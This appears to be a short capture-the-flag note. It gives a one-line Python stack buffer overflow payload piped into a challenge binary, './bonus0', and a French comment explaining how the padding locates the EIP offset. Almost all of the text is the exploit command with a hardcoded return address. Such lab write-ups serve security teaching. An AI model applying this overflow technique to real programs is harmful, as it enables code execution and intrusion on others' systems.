(python -c "print 'A'*4095 + '\n' + 'A'*9 + '\x2f\xf8\xff\xbf' +'A'*8 " ; cat) | ./bonus0

+ 'A'*9 pour trouver l'offset de l'EIP